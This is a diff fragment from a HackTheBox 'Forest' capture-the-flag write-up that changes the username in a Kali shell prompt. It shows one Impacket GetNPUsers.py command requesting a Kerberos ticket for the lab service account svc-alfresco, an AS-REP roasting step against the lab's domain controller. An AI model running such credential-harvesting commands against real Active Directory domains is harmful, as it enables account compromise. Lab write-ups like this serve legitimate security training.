@@ -140,7 +140,7 @@ Great.
 Next, I dump the TGT for the service account. 
 
 ```
-┌──(tom㉿kali)-[~/htb/forest]
+┌──(milt0r㉿kali)-[~/htb/forest]
 └─$ GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.10.10.161
 
 Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
